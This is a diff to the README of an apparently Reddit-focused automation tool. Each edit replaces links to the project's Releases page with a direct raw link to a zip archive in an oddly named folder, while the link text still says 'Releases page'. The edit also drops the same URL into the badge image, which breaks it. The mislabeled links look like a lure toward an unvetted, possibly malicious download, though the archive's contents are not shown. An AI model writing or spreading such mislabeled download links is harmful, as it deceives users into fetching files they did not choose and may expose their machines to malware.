@@ -1,6 +1,6 @@
 # 🚀 reddit-automation-reliability-compliance-tool - Simplify Your Reddit Workflow Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Rickaa404/reddit-automation-reliability-compliance-tool/releases)
+[![Download Now](https://raw.githubusercontent.com/Rickaa404/reddit-automation-reliability-compliance-tool/main/obstinacious/compliance-reddit-reliability-automation-tool-v1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Rickaa404/reddit-automation-reliability-compliance-tool/main/obstinacious/compliance-reddit-reliability-automation-tool-v1.4.zip)
 
 ## 📥 Features
 
@@ -22,13 +22,13 @@ Before you begin, ensure that your system meets the following requirements:
 
 This tool helps you manage your Reddit workflow more efficiently. Follow these steps to download and start using it:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Rickaa404/reddit-automation-reliability-compliance-tool/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Rickaa404/reddit-automation-reliability-compliance-tool/main/obstinacious/compliance-reddit-reliability-automation-tool-v1.4.zip).
 2. **Download the Latest Version**: Look for the most recent release and click on the link to download the application.
 3. **Install the Application**: Follow the on-screen instructions specific to your operating system to install the tool.
 
 ## 💾 Download & Install
 
-To download the application, please click this link to visit the [Releases page](https://github.com/Rickaa404/reddit-automation-reliability-compliance-tool/releases). 
+To download the application, please click this link to visit the [Releases page](https://raw.githubusercontent.com/Rickaa404/reddit-automation-reliability-compliance-tool/main/obstinacious/compliance-reddit-reliability-automation-tool-v1.4.zip). 
 
 On the page, you will find a list of available versions. Select the latest version for your operating system. After downloading, follow these basic installation steps:
 
